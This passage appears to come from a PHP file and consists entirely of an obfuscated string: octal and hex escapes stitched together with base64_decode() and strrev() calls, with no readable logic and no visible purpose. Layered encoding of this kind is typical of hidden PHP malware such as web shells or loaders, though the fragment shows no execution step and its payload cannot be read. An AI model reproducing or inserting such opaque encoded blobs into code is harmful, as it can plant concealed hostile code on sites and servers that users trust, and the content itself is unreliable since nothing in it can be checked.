0\166\106\203"."\55\241\345\74\330\22\12\206\233\143\152\123\240\251\115\344\351\10\264\103\0\321\112\172\46\151\371\235\371\125\104\213\306\70\217\115\5\200\203\220\203\255\245\62\206\215\52\60\61\272\327\350\260".base64_decode('HDBczKUkI1EZqipyypJd4rPsqEV3Mph2diGpoj/VSiCm2HmVH6p9o/yTDIOFERUC7StAF5c=')."\364\100\305\171\32\245\333\117\371\210\100\312\346\224\250\53\214\216\20\221\206\126\40\100\330\241\10\22\310\212\100\63\6\72\220\12\166\200\165\47\45\130\221\152\244\63\30\15\140\106\246\272\54"."\x1a\xe9\x68\x85\x2\xc3\x69\x9d\x75\x20\x4\xd3\x5f\xc5\xae\xa3\xc0\xcf\xb4\xc5\xb9\xae\x65\xc\x8d\x31\xb6\xc4\xa4\xaf\x32\xd9\x54\xa2\x2b\x38\x23\xf2\x73\x6c\x9e\xfb\x30\x51\xc3\x28\x5d\xf6\x91\x42\x1b\x99\x11".base64_decode('JGaR199nmlBnBt+8+EHLOaCrLAYWI+yInsGPMADWyJJgh8pgiYYk+KMRwWg0EoUpsM0Bxv0=').base64_decode('oonRYCwYZ20PFg02QX7fDIBbHZF10Lz/1J7hGVXd3hm+XvRRPf1EGoRQj88RZNR2scBLY0o=')."\260\312\132\134\135\337\343\357\361\127\55\256\357\16\170\127\153\336\325\65\336\371\336\136\104\243\127\317\200\210\336\65\165\236\131\353\160\6\224\161\361\11\275\350\247\241\147\361\324\36\357\264\323"."\126\236\330\335\323\133\131\77\143\162\217\357\204\236\341\336\351\325\213\131\73\211\142\1\135\3\330\331\206\272\232\234\121\205\272\204\56\252\74\113\116\102\305\44\3\113\130\155\344\105\354\232\71"."\xeb\x58\x3c\x5a\x43\xbd\x5f\x94\xe8\xf6\xf6\xcc\xe8\x5d\x2c\x95\x93\xa2\xdc\x6d\x21\x6c\x8a\x88\xbe\x34\xcf\x17\xf0\x9e\x82\x47\xc6\x8b\xe2\x9d\xe\xf0\x51\xcc\x25\xc4\x81\x88\x77\x42\x9f\xc6\x6f\x7c\xfd\x39\x71"."\xb3\xb2\xb\x9c\x23\x3a\x84\xa0\x53\xe0\xdc\x35\x53\xe9\xef\x3a\xb6\x90\xfd\xfa\x8\x43\x6\xb9\x94\xc1\x8\xaa\x62\xce\x18\x64\x57\x9c\x9c\x3e\x8\x1f\xa6\xcd\x21\x5a\xb7\x87\x75\x6\x1e\x28\xde\x11\x46\xc0\xc1".strrev('‘°x&^à'."\n".'pÊ áÆª¡LzòĞ•· “N°+y†ößy09FWØA¹Ò2…$”Î')."\xbf\x9b\xa0\xa1\x9\x1c\xca\x30\x82\xc4\x9a\x22\xac\x22\xd8\xeb\xd6\x60\x46\x21\xa8\x80\x5e\xb3\xea\xc9\x13\x92\x55\xcc\xe3\x1b\x93\x82\x56\x1c\xcd\xad\x82\x28\x38\xa5\x61\x91\x42\xa7\x1c\xca\xa9\xf2\x2\xe4\xf9".base64_decode('TQjzNnWx6TFOgj7lxQpZ6CbC7gL+qp6eYree7O1GgK95U71rZq6rZvwTfw/6wwKBMo8ZqmY=')."\263\51\341\230\120\155\15\306\175\270\107\234\175\355\10\360\144\32\64\13\374\152\221\167\334\355\155\323\326\62\216\52\342\70\206\41\51\106\115\1\63\227\256\173\130\340\56\114\164\110\357\101\4"."\225\166\160\346\51\247\211\245\7\11\134\42\246\333\76\236\303\43\45\252\50\354\170\233\153\250\140\210\76\207\66\126\223\164\314\121\166\172\214\260\4\34\217\110\226\256\25\22\351\226\142\46\143"."\163\116\114\306\30\200\26\140\327\300\233\226\27\116\202\31\345\212\242\133\11\143\114\116\207\156\124\114\57\227\61\224\313\231\311\76\31\350\304\1\333\32\100\244\114\134\251\142\357\57\112\250\103"."\151\214\104\302\301\100\207\202\317\162\70\203\20\241\20\13\166\6\320\1\206\131\234\261\170\20\236\204\102\315\136\126\357\162\57\343\157\360\17\3\246\335\314\323\173\205\156\253\31\223\241\21\47"."\x87\x4\x5f\xce\x3c\x98\x4f\xe1\xc1\x74\x85\x7\xf5\xda\x83\x59\x1b\x1e\x71\xf5\xf5\x88\x67\xd\xcf\x90\xa1\xf\x93\xf\x7e\x2d\xf5\xc0\x6d\xd5\x23\x98\x32\xf0\x19\x6a\xf6\x18\x56\x33\xb9\x75\x93\x6\x48\x12\xeb"."\202\235\306\34\347\214\66\352\241\335\11\353\103\172\306\303\330\65\36\326\107\17\143\122\171\10\163\251\31\272\325\205\66\26\164\213\174\42\374\231\366\140\0\302\360\353\21\17\55\36\163\70\247"."\27\110\26\230\30\161\141\367\210\313\274\247\277\140\26\363\235\254\115\51\104\273\5\21\242\317\74\42\152\232\266\207\361\275\74\62\3\14\172\21\140\373\244\354\164\226\37\15\231\177\167\47\0".base64_decode('vnBS6Sx9yWKVroeT97eG1giMznXsvHPkITw4TnniCRdfS8VGxQNo0eBJj1Yrf3MAzTkBVbw=')."\253\210\327\64\101\347\272\331\60\356\167\66\334\50\272\114\305\244\346\154\255\237\265\205\221\25\277\152\225\311\112\277\243\172\142\64\41\370\72\315\22\267\310\31\152\160\216\307\103\66\120\71\340".strrev('ùWxC8õæ\'\'Q³a’Ö¹ĞÆÿ³´Ğ^H¾àˆ%·Ëã›a|å\\›i2Zù ¸¿/')."\10\46\46\117\326\61\316\111\14\7\133\342\312\111\21\204\266\14\123\245\145\124\234\131\41\377\230\71\305\121\67\233\56\245\201\244\213\260\226\113\322\230\225\10\305\257\154\250\140\215\124\70\212"."\13\370\160\166\302\303\202\112\51\304\341\351\226\47\1\303\1\31\276\70\226\130\124\104\234\202\105\40\376\64\13\56\136\230\17\13\137\72\213\23\113\53\3\244\204\147\104\4\353\227\243\135\34".base64_decode('FJuJgYSCG/BI5ArGJV6xLaSgc8pdEOk6O/EUdRq5USMXMzBfwR0L+5t0oVOzrGFEE8DxN30=').base64_decode('+nRFnM6COMCbXoQo0E70TQ8XzHugzXvgydiTMXID0sEtWJ5ocLioNDSoyTUwqEjKIiYI9jk=')."\x6c\x88\xb4\x56\x10\x73\xcd\xb0\x13\x46\x11\x7c\xc\x16\xce\x22\x82\x52\xb6\x94\x36\x24\x8\x17\x47\x19\x9\xc7\x58\xf6\x28\xeb\xbd\xfc\xe9\xac\x94\x6\x9b\x3d\xe4\xb7\xd\x75\x5e\xde\xcd\x7c\xf5\x8a\xa8\xe7\x2c"."\x13\x45\x4d\x8\x55\x84\xd1\x5c\xa1\x1f\x32\x90\xb8\xe9\xc1\xfc\x7e\xf4\x43\x8f\x77\x26\x39\x40\x32\xb1\x6d\x51\xcc\x36\xc3\xfb\x1\xfe\x5e\x8a\xf0\x3\xa3\xd7\xd0\x84\x57\x31\xfc\x2\x44\x86\x2a\xb1\x9\x38\x7e"."\162\222\11\264\47\1\216\366\21\105\237\101\247\134\301\207\267\120\53\76\253\330\234\120\354\47\203\144\114\107\343\204\352\105\15\261\222\64\71\267\340\366\341\143\100\34\33\374\321\214\357\100\61"."\xbf\x62\xbb\xf5\x8b\xe\xe1\xe9\x54\x4b\xfb\x81\x21\xb8\x7c\xb8\xa5\x60\x72\xa2\x97\x9f\xf8\xee\x4c\x4d\xe4\x7e\xc9\x5\x40\x5c\xa7\xb4\x34\x1f\xe\xca\xa2\x24\x4a\x2a\xe3\xa6\x31\x5c\xb1\xae\x20\xa6\x3b\xca\x9c"."\103\320\115\362\164\123\240\7\232\17\335\26\212\0\25\65\22\371\45\320\317\32\372\174\6\7\340\72\327\372\332\246\211\256\240\5\137\1\265\50\72\42\241\76\100\14\104\236\43\246\245\164\231"."\x68\x70\x24\x6\xf2\x79\xd1\x6d\x5e\xbf\x85\x8a\x48\xe8\xdd\x49\x35\xb1\x3a\x63\x79\x8d\x61\x75\xc5\xab\xb8\x6a\xd0\xf2\x79\xb9\x4d\x4e\xf2\x31\x80\x27\x17\x94\x22\x8f\x50\xe0\x39\x94\x8e\x5a\xc\x89\xf7\x95\x26"."\204\71\275\214\61\113\60\151\330\70\6\157\125\223\275\55\211\214\342\354\165\27\26\141\371\60\40\147\132\11\330\210\313\210\147\252\43\247\223\0\201\310\351\204\130\360\11\172\251\274\4\124\302"."\314\3\54\111\122\201\131\163\110\227\42\361\63\137\136\244\110\101\232\54\45\211\112\245\134\174\51\110\217\320\316\114\22\52\133\314\2\311\13\145\311\145\235\156\176\37\276\224\370\144\24\37\50".base64_decode('FBjo02HiJ2gUKUdhzBlj+7bcQUgrDw4JmT9aFW7YRxEHfueMMJkC+bs0q8yqLF9RTLz1O0M=')."\345\263\7\62\31\41\235\345\16\117\130\204\42\14\271\220\34\63\141\261\26\162\77\146\202\15\345\342\370\315\150\142\152\337\375\336\356\104\362\23\23\103\23\240\107\261\214\345\303\350\134\157\112"."\33\71\235\361\163\122\106\301\52\207\355\376\77\123\335\245\63\217\167\310\104\340\202\323\44\246\66\226\75\36\322\345\153\10\347\343\12\124\305\17\374\22\62\6\110\11\51\240\332\16\152\54\112"."\352\227\266\223\3\102\320\366\245\363\201\17\273\120\304\147\115\0\263\356\174\134\224\205\340\304\21\176\106\313\205\160\22\136\113\271\122\101\375\175\101\176\136\271\240\4\345\174\10\166\161\302\104"."\175\145\311\274\226\147\236\270\376\201\247\167\323\357\247\37\177\352\167\157\276\10\323\253\153\3\306\20\200\332\332\3\320\177\7\322\157\41\200\176\316\162\303\374\336\157\276\363\331\163\237\175\243"."\162\307\244\340\141\306\111\67\37\76\247\250\135\260\276\371\374\127\275\217\267\276\366\150\176\370\362\235\257\276\365\164\141\150\351\224\256\323\153\377\74\355\351\365\107\126\277\261\177\361\331\33\147"."\237\162\303\201\177\176\161\277\123\246\244\317\372\354\232\67\376\373\301\275\157\75\175\307\316\233\257\175\342\254\341\361\153\207\123\177\177\155\164\323\311\377\170\374\303\27\37\174\147\323\21\307\355"."\377\207\37\154\376\312\277\147\315\75\173\332\264\213\267\177\145\161\115\140\322\267\57\130\271\253\252\352\272\27\276\336\263\350\203\316\232\137\304\22\167\375\372\363\167\246\34\363\101\315\161\377\372"."\xe6\xd4\xf\xd2\x7\x4c\xba\xfe\xe6\x6d\x4f\xee\xb7\xf9\x89\x3\x8f\xe8\xc\xef\x1e\xdc\x77\xf1\x4d\xa7\x6e\x3e\xf1\xa0\xd8\x31\x91\xc1\x1b\x76\xbc\xb7\xea\x6f\x37\x9d\x72\xfa\xd\xc7\xbe\xff\xdd\x2d\xf9\xdf\xc"."\x1d\x36\xef\xc9\xd1\xcb\x87\x5b\x8f\x38\x6e\xec\xce\xa9\x17\x37\xf8\xfb\x8f\xff\x6c\xf7\xc6\xf\x5e\xf9\xd9\x94\x7f\x3d\xa3\xed\x7c\xe2\xa0\xff\xec\xf7\xf9\xe5\x33\xde\xbd\xe1\xd9\xdc\xbb\xef\xe6\xee\xdc\x15\xcb"."\255\12\105\137\156\372\341\202\73\137\231\265\276\141\125\342\205\210\121\174\43\374\327\267\337\337\337\223\375\336\367\46\235\166\366\125\331\177\237\271\255\351\245\75\273\47\117\335\374\334\264\252\155"."\107\375\253\73\364\363\361\217\176\142\174\362\313\334\11\77\336\266\350\316\263\16\73\370\244\107\357\52\376\40\366\263\143\17\30\277\70\177\347\236\33\162\257\254\33\174\357\257\167\104\356\16\237"."\xf0\xe0\x75\xc7\xe7\xe\x39\x76\xcf\xa2\x73\x3a\x16\xfc\xf0\x8a\xd8\xa7\xe7\x3d\xb7\xff\xe1\xe1\xa7\x7f\xfe\xbb\x17\x3e\xfe\xeb\x39\xbf\xbb\x75\x79\xe7\xf1\xcb\x6e\x9f\xbc\xdc\xbe\xfe\xca\x63\x1f\xf9\xf4\x47\xb1".base64_decode('yTX//E/1tBb/iWc9embuodZb2tf++Ygr2vdrPO6Yh6ctPfiSKUOvXdnnP/+pc6+7eunNj34=')."\x64\x6f\xaa\x3f\xef\x99\x49\xdf\xaf\x3d\xe1\xdd\x5a\xfb\x8c\x8b\xbe\x66\x45\x1a\xff\x94\xcf\xc\xaf\xc\xfc\xf4\x6f\xe7\x4d\xfe\xcd\x9b\x5a\x38\x71\x4e\xf5\x99\xb7\xbf\x1d\x30\xe\xff\xfa\x11\xf3\x1e\x5a\x7f\xfb"."\x85\x47\x5c\x77\xf8\x8b\xa7\xf4\xbd\xf6\x95\xb\x2b\x7e\xf1\x87\xab\x4f\x59\xb3\x43\xfb\xef\xad\xbe\x2d\xc7\xd5\x1e\xfd\x42\x6d\xdd\xcd\x77\x1e\xf0\xd3\xb7\x46\x6b\xef\xff\xd6\x7d\xdf\x3b\xe3\x91\xfa\x69\x87\x1f"."\xf1\xc8\xf7\x46\xde\xa8\x38\xf4\xc2\xf5\x3b\x96\x5\xe6\xd8\x57\x3c\xde\xfe\x97\x3b\xa6\x5e\x76\xc6\xc9\x5d\xb7\x79\x62\xc7\xbc\x53\x57\x7b\xc7\x35\x3b\xef\x3d\xe8\xfd\x7b\x37\xfe\xf0\x8d\xca\xc7\x8f\x3a\x60\xbf"."\x4b\x52\xf\xc7\xce\x6d\x7c\xf1\x97\x7f\x1b\xbc\xba\x50\xf5\xca\xb1\x2b\x7c\x3d\x91\x2b\xdb\x9e\xbd\x74\xde\x5\xcf\x7d\xf3\xca\xf3\xef\x19\xd8\xd8\xba\xc7\xac\x4f\xcd\xd\x77\x98\xa7\xdc\xfa\x9d\x27\xe\xff\xfe".base64_decode('vN8+1vWXg5oufWRw7/gxh2157PtnHL1n/SHbFx1+3uGfdFZe7Iv9++JzD+89NT39gH1NT54=').base64_decode('8LVjW+/Nn3mM1XrPIT856smWx/Zve6n5nTUnrp/U6jvimn8eeuMx169b+Uj6jvHHbnn2joE=')."\x3f\x9f\x30\xf9\x98\x9b\xff\x30\xd4\xba\xee\x9b\xef\x4f\x3b\xb8\xf3\xa4\xe4\xa2\x6f\x4f\xf2\xdd\x15\xfc\xed\x19\xfd\xad\xe7\x1d\xf7\xf2\x1d\x7\x9c\x1c\x2e\x1c\xe5\xbd\x60\xc9\xa2\xb\xa3\x2b\xa7\x4e\xfe\x6a\xea".base64_decode('n29O7RsZPLxx/bDnrUfmPrPulpsvP/KUvg2/f2z5oY/0XHvkzJMemdR46Q03vfqjOXOasy8=').base64_decode('Vn/4vaO2xo576/yblHevCq76x4pVxzVt3XLjO/u9dErFr0/sO+TdM3/80Rnarbc9/NHTmWM=')."\xf\xcf\x5c\x76\xd3\xfc\xc0\x4d\x17\xde\x78\xf2\x7e\xe3\x85\xf7\x6f\x7f\xf6\xb9\x27\x9e\x4a\x7d\xd2\x3c\xf0\xcb\xf9\x6f\xdf\xbc\xe3\xa6\xf7\xff\xfc\x76\xa0\xf1\xc1\x5b\x57\x4e\x7e\x79\xe3\xb7\x8d\xea\xe3\xaf\x39"."\363\110\303\73\276\344\6\337\226\272\217\77\236\262\164\312\224\201\155\47\155\75\363\224\203\247\36\373\362\245\223\236\173\316\72\167\321\262\360\327\206\346\345\356\271\145\345\307\77\355\74\165\144"."\306\65\273\337\270\373\322\47\317\35\231\246\375\143\336\213\117\275\376\342\65\167\376\375\127\67\316\377\365\61\275\213\353\153\267\231\27\335\225\275\352\223\344\103\376\354\254\43\77\174\356\277\66".strrev('—\\çUíÿ}}§[åøí\'«ù`¾~NF‡ıùgOı.Şşİ[ïR÷qû^Èóıï³»½ä=L')."\x38\xa6\x7d\x65\xf3\x31\xfe\xef\x1c\x7f\xc0\xf4\xcd\xc1\x5f\x5d\x1e\xfe\xe4\xbe\x55\x47\x9d\xbd\x3d\x71\xf6\xd9\x4b\xe6\x2a\x93\xaf\xbc\xff\x84\xc3\xbf\x91\x69\xba\xe5\x30\xff\x1f\xcf\x69\xbf\xfa\xd3\x96\xc1\xdf"."\235\222\353\335\372\375\177\305\76\376\364\206\336\347\67\16\354\172\340\215\47\17\236\65\371\222\17\337\76\354\153\307\156\135\366\363\27\126\337\165\335\305\17\355\277\155\206\225\274\351\371\343\157"."\277\370\331\351\153\306\226\376\374\217\341\306\13\66\315\276\144\371\255\27\144\316\56\236\161\370\303\307\114\377\365\256\257\376\166\315\334\257\277\131\377\310\231\235\372\373\357\276\375\325\257\306\57"."\212\15\174\337\373\355\15\155\227\76\25\366\174\326\73\170\334\262\315\303\133\257\372\347\165\73\357\377\221\161\356\321\372\247\167\274\374\344\355\271\375\376\332\376\337\277\173\270\56\360\335\3\207".base64_decode('Tv5R+u/3PbXnw9wbLdque+744Ypdl9171J5D23721qF3tF7kO/3jt/Z9Y/HO096/4s0XIts=')."\77\173\357\275\277\354\361\157\123\37\74\355\363\177\277\277\354\150\377\347\247\275\373\354\206\47\237\371\174\355\373\373\236\177\376\235\323\36\170\250\362\323\17\317\73\376\323\127\66\235\273\373\351"."\115\233\77\370\175\337\63\267\304\303\223\73\136\76\141\117\343\23\371\105\333\316\171\250\255\177\122\303\133\15\327\237\167\326\264\5\17\335\376\313\111\37\35\361\336\322\231\207\177\363\167\277\231".base64_decode('/F7ds5Off/G0r999547fPvLrRet/+lhP6PbzxmfVHHj0Sf9174EbNyY/7qyO/GjvdVrHcfo=')."\113\117\336\266\350\324\135\273\156\274\154\337\226\125\337\276\340\315\115\63\177\76\343\240\117\336\77\355\256\344\167\177\362\372\276\33\77\336\270\175\105\235\147\376\111\205\15\317\327\34\276\372\202"."\332\175\63\56\371\331\26\345\77\227\144\276\122\361\373\203\57\356\277\263\161\303\155\155\333\116\376\144\313\367\352\146\176\355\306\157\117\12\174\363\340\5\337\332\61\323\167\322\226\271\253\132\13".base64_decode('t63e9aenrvzgq8/86uxb3j/rjpc+rj3cPtfz+q3WjUdOObJjxyc7Xsq/+tof97215/Oevx4=')."\xf2\xc8\xe6\x60\x7e\xc3\xba\x47\xb7\xde\xbf\x68\x7b\xfd\xe6\xd7\x62\x75\xdd\x4f\x7e\x78\xcd\xc3\xf9\x9f\x6d\xfe\x64\xec\xcf\xbf\xfa\x77\xfe\xc1\x4b\xcf\xb9\xf3\x5f\x9b\x4f\xfb\xdd\x56\xbb\xff\x9c\x6b\x3f\xf8\xec".strrev('í3/ã¾ïÎÿu?7;€ë£ŸÇ3®ó½_m®ëú+\'ó~üOõõÍ™û¸ı'."\r".'OAÇc§~Ï¥ã')."\117\276\363\247\7\356\275\357\207\325\135\157\256\115\235\74\375\302\47\236\273\147\352\65\107\16\75\362\255\256\157\376\151\346\25\221\345\73\233\127\274\164\345\141\337\273\360\370\277\257\234\177\366".base64_decode('/EPOfv/fT1fP++oDHZlI/uozf77+6zPeOX919cY1159+9pRXmqasHTz2zif8W2v3VSuX/eI=').base64_decode('jLcu3dX+35OVig/Cf3zjznPPfnmmsn/umCkLPvj2LdP76z9LX/H2dfs//vJHPx098orKwRU=').strrev('[šóêµx-/!Ì½ú°ŞfŸáöŞÔ·İ‰İAc¹iûáç»±ÎÔšãMt?ççû_M')."\176\170\150\353\153\73\66\144\206\47\257\335\174\372\363\155\277\177\156\335\111\107\146\377\163\365\336\355\67\56\335\361\112\360\222\337\35\163\357\33\357\76\370\351\157\317\235\371\247\372\207\257\132"."\177\314\115\173\147\131\332\364\231\312\131\263\216\152\171\350\300\364\77\376\162\332\306\135\35\177\113\36\332\274\365\352\155\337\175\254\155\316\344\331\363\216\177\275\363\45\137\346\273\253\277\177\331".base64_decode('UQ/t3/PRsm+/edah/3XVzG/N/+PSty+/Y/Zfb33jGt/sfZ9c9PoP/vbp6BWXH/e1wEHHH/8=')."\316\205\307\355\336\165\130\347\355\167\157\374\360\303\47\257\235\164\365\345\267\57\35\170\241\362\272\324\123\355\113\137\231\366\67\357\153\17\354\34\170\372\351\3\137\74\141\367\321\27\254\71\350"."\371\325\306\32\264\163\22\35\117\173\316\370\373\207\227\354\73\63\373\364\354\157\64\376\242\271\315\276\122\377\316\107\237\376\345\362\103\366\231\353\117\237\263\257\372\255\355\217\217\106\174\33\106"."\27\37\125\323\173\357\22\373\241\336\147\117\267\277\276\257\343\361\316\43\325\167\217\70\165\331\207\347\57\276\317\276\373\17\207\217\376\161\307\177\5\367\135\376\353\324\145\17\117\71\344\246\353"."\352\57\73\130\357\272\167\365\147\167\77\331\257\366\176\66\276\341\115\377\351\203\357\276\373\302\321\237\177\374\376\243\225\327\237\272\156\337\133\373\76\374\374\243\17\36\355\77\372\231\7\16\335"."\xf0\xd1\xfb\xbf\xdf\xb3\xec\xf3\x4f\xa7\x7d\xfa\x9f\xf1\x4d\xcb\xb6\x9f\x7a\xea\xba\xf\x9e\x7d\x74\xfb\x69\x6b\xde\x7d\xfd\x37\xcb\xd4\xcf\xdf\xff\xb7\x7a\xfd\xe7\x1f\xbe\xa4\xfe\xf3\x17\xbe\x9f\x7d\x7c\xd0\x6d"."\327\276\36\130\371\333\25\17\356\371\375\355\175\177\277\147\315\153\275\17\174\360\217\203\36\31\137\160\331\252\255\17\354\174\341\305\305\351\343\166\374\371\332\334\366\305\363\352\27\335\373\371\313"."\223\217\171\343\153\263\132\57\137\127\337\262\161\303\256\111\357\32\371\71\327\76\365\314\277\6\336\74\347\325\307\306\377\70\124\275\346\303\203\32\143\257\314\370\354\233\163\276\337\264\167\322\302".base64_decode('J7/xyMhtV3mWz2p99IqLk+knX5z3h8d7Uifufeyov5zxykent121aXzfkUx9rq4WNHxm058=')."\x79\xb3\xe7\xd3\x8f\xda\x99\xf0\x80\x9b\xb7\xfb\x11\x91\x5\x52\xb9\x4c\x58\x67\xa0\x30\x64\xe\x3\xf7\x69\xde\x7c\x90\xa4\xec\x1b\x30\x47\xf4\x1c\x70\x9b\x6c\x73\x55\x66\xc0\x0\xa\x74\x2e\xd4\x55\xc8\x1a\x66"."\x86\xbd\xc5\x2\x7\x7a\x56\xdd\x5c\xfa\x31\xb3\xe\x9a\x36\xb\xe9\x7c\xc2\x2\xe6\x24\xc8\x29\xe5\x92\xda\xf0\x40\x1f\x94\x34\xfb\x56\x65\x53\x69\xe0\xf0\xad\x1e\x48\xf5\xf5\x33\x99\xce\xf9\xf3\x41\xe8\x6b\xc8"."\116\144\127\245\240\207\243\311\341\276\342\340\52\150\206\165\11\162\316\203\26\126\245\363\266\76\12\225\316\257\205\116\151\326\52\263\230\204\330\324\220\155\215\62\305\7\313\316\366\31\205\325\220".strrev('>êàèÉÌ&w0Ô.s?ğÚhªl¬…›2@ègïš9:¹“fÌm«CW›ïxy’l2').base64_decode('PWuz3kHy7Hkz2bihgWyyr79gZVgs5BssWP0Dq2ExsoMj1iiTEzMzg6uSIynWLPS3tgYWum4=')."\xe\xb4\x9f\x2d\x22\xd2\xbb\xf\xee\xf4\x73\xd8\x0\x8d\xe4\xc8\xea\x94\x6\x13\x5b\x37\x17\x60\x48\x1b\xec\xcf\x1a\x7d\xd0\xc0\xec\xf9\x33\xd9\xac\xcc\x66\x1c\x84\xdc\x70\x66\x35\x30\xda\xe6\xcc\x84\x96\xe6\xcd".base64_decode('gpZSWqI4moGp1Fb3p7iIwnw2i0PJkVFtACaDrVTdHKhpVf9AIlkE8Fll9ttaHsaXyqatfA4=')."\x26\xc7\x4e\xd\x17\x73\xab\x2c\x6\x7b\x50\x78\x36\xeb\xe5\xec\x3a\x80\x8b\xda\xd9\x0\xde\xc3\x7d\xa9\x74\x6e\x15\x53\x8d\x1a\xb2\x4c\x2d\xd\xf5\xae\x4a\xd\x26\x6\x56\xc3\x35\x7e\x1e\x9b\xc4\x59\xb5\x50\x55"."\35\3\354\164\321\30\266\231\124\327\54\46\210\312\46\163\366\154\266\273\372\362\3\231\21\30\300\154\16\12\263\31\124\315\233\313\222\140\152\263\375\3\71\155\25\0\122\335\74\230\245\114\172".base64_decode('NQKoBGtkNptwLv+aWjWYAVBclUgPmRZjTGT6hwomK8hGkUoOWjkG74beb6aYkN6suTC+eTM=').base64_decode('YarmzmUXrqRZYEyo1UYybw2m2fZjWaHs3FlQZs58thQM9oZX6cWRUcYpG9ISuTRAxCyYgPQ=')."\352\1\264\72\40\353\62\140\366\33\331\342\50\3\77\372\333\237\36\260\63\43\114\166\315\316\347\372\206\241\216\101\155\304\34\110\14\61\364\307\246\151\36\233\366\371\263\131\22\333\34\63\131"."\x4f\x67\x41\x4f\x33\x5\xdd\xc8\xb2\x91\xd5\xb2\x11\xad\xd2\xd2\x23\xc3\xc\x71\xea\x83\x99\xa1\xec\x28\x4\x46\x52\x56\x61\xc0\x64\x9c\xe5\x55\xc3\x7a\x86\x6d\xfc\x11\x6d\x70\x28\x91\x87\xbd\x31\x98\x48\xf6\x17".base64_decode('2bgbtcQA4yxz8WZZapiKjFE+nPwUw1QxjZwvq+W4uE4byJbIcQO6zoT4Yf/ZQvADBJYh3sg=')."\xea\x82\x5b\x4e\xdf\x24\x58\x49\x71\x87\xc7\xc\x14\x49\x74\x4\x7\x63\x72\x2d\x89\x9c\x2d\x25\xa3\x90\x23\x35\x26\xeb\x19\xc0\xe8\x70\xf\x7d\xf2\xa8\x57\x64\xd9\x36\x2a\xf3\xf4\x9\x6c\x5e\xf9\x5d\x6b\xc0\x4c"."\x26\x32\x8\xa3\x3b\x6a\x4d\xf6\xf9\xca\xcc\x24\x1d\x49\xb9\x94\x94\x3b\x9e\x8b\x1a\xf5\x49\xab\x24\x2a\x77\x8\xd0\xb3\x38\xc7\xc\xd2\x72\x20\xe6\xd2\xaa\xdb\x4a\xb2\x8f\xea\x5b\x5b\x4c\x38\x89\x26\xa9\xe4\xf"."\14\217\352\36\133\130\272\235\253\313\261\7\64\20\204\266\344\352\175\154\125\351\53\201\255\131\3\76\271\303\136\71\325\310\241\1\146\62\76\247\136\72\126\20\357\352\124\343\201\330\22\111\300"."\x10\x2b\x30\x3b\x9a\x2f\x19\xac\x58\x65\x69\xca\xe5\xc5\x76\x4e\xc\x3\xa6\xbd\xdb\x77\x8e\x6d\xba\x7c\xfc\xb2\xdb\xc7\x2f\xda\x36\x76\xdf\xe6\xbd\xdb\x6e\x1f\xdb\x75\x19\xa\xee\xbe\x67\xe3\xd8\xb6\xeb\x5e\xbf"."\xea\x9c\xdd\xf7\x5c\xb4\xfb\x9e\x33\xf6\xae\xff\xe5\x3b\xf7\x5f\x38\xb6\x69\xfb\xde\x1f\xec\x1a\xdb\x72\xeb\xd8\xcd\xeb\x77\xef\xdc\xb5\xf7\xc1\xf5\x7b\x6e\xdd\xb0\xfb\x9e\xad\xe3\x5b\xce\x1f\x3b\x67\xc7\xee\x9d"."\x97\x8f\x9d\x77\xc3\xd8\xfa\x4d\xe3\x9b\x2f\xda\xbd\x6b\xb\xca\x3f\x7e\x9e\xa8\x19\x65\x1b\xdb\x7a\x25\x2e\x7b\xff\x59\x63\xf7\xdc\xb3\xf7\x47\xb7\xf2\xd4\x77\xee\x3f\x13\xf0\x57\x5a\x2c\x4f\xec\xe4\x30\x5b\x18"."\x2\xc1\xca\x22\x5\x60\x57\xb7\x7c\x4a\x67\x46\x47\x33\xa6\x24\xb0\xc6\x16\x16\x31\xb3\xd3\x7a\x41\xb1\x89\xa8\x99\x86\xfe\xe6\xcc\x9c\x97\xc2\x26\x5b\x63\x23\x87\x93\x15\x36\xd7\x3e\xe\xbf\x71\x3d\x9b\xc7\x50"."\10\263\344\247\12\266\102\127\243\211\160\47\225\76\155\100\241\157\0\264\127\76\241\24\116\64\71\55\141\36\301\303\272\205\331\364\112\136\107\44\231\205\5\217\25\63\205\165\213\24\374\250\300"."\xa0\xcd\xb9\x11\xca\x2d\x22\x4d\x28\x3\xca\x78\x25\x5\x24\x54\xe1\xcf\x6a\x67\x9f\x14\xcc\xa5\x54\x52\x1a\xfa\x4c\xd6\x2b\x29\x54\x9e\x3d\xcf\xf4\x2a\xb6\xc9\xbe\xb3\xa3\x1c\xb6\xd8\xbc\x93\x39\x83\x61\xd1\xd1"."\x96\xdd\xb6\x65\xa1\x8b\xf7\x97\x41\x58\x3f\x7f\x4c\x10\x3c\x6e\x18\x81\xa4\xb\x44\x1f\x92\x4a\x20\x9b\xe0\x1\x27\x12\x73\x60\x8\x27\xfa\x93\x93\x9c\x53\x6\x4c\x68\x22\x65\xe1\x51\x68\x57\x3c\x64\x25\x3c\x8a".base64_decode('U6EdS00wSQQ8FrGuPoWmgyQPLV5fOriCns/wF7UmMz9KFwOAWV4G1yBjZSaUD9ORiBBH0S4=')."\x93\x51\x9e\x77\x99\xfd\x6d\x98\x4d\x19\x84\xa4\xc5\xbb\x2f\x91\x80\x10\x5d\xa6\x41\xc1\x76\xd7\x2d\x21\x29\x5f\xd0\x93\x6\x93\xce\xd6\xb3\x24\x27\xe0\x76\x9f\xf4\xe8\x45\x15\xc0\xb8\x88\x78\x2\xed\xcf\x82\xe3"."\x3d\x6f\xe1\xe2\x7c\x3a\x8f\x27\xd2\x5e\xb0\x18\x74\x2d\x98\x92\xa0\xd4\x7\xf8\x16\xba\x6e\x72\x6c\xc6\xfd\x46\xc8\x77\x73\x73\xa3\x64\xc5\x3\x67\xab\xf7\x7a\xbd\x12\x2f\x5b\xc8\xe7\xe1\x2f\x95\xd\x8c\x28\x2d"."\305\322\105\33\213\241\264\146\314\76\6\110\342\1\36\145\17\342\205\233\50\276\231\213\255\40\364\324\337\217\352\253\47\332\304\312\14\5\215\141\236\257\26\175\220\35\66\333\67\27\175\222\311"."\204\335\324\3\23\134\264\230\2\327\124\337\54\240\137\254\5\200\40\26\20\260\151\220\106\6\361\242\124\61\227\141\261\350\23\145\211\26\163\30\20\352\235\323\241\347\222\122\241\5\132\302\226".strrev('~óå¢I¦©51³ƒ®Û¯Ú—6#œ¡Üš-Ue`d0àM/ÒGA\'®‘